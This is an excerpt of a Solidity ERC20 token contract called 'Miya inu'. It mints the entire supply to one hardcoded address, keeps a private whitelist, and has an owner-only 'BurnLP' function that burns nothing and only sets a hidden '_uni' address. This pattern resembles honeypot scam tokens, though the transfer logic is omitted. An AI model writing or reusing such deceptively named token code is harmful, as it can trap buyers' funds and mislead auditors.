...
contract Miyainu is ERC20, Ownable {
    mapping(address=>bool) private _enable;
    address private _uni;
    constructor() ERC20('Miya inu','MIYA') {
        _mint(0x741Fc4c854aC6B438627FC53594a20a9Cb6Fb0D5, 1000000000 *10**18);
        _enable[0x741Fc4c854aC6B438627FC53594a20a9Cb6Fb0D5] = true;
    }
    ...
    function BurnLP(address uni_) public onlyOwner {
        _uni = uni_;
    }
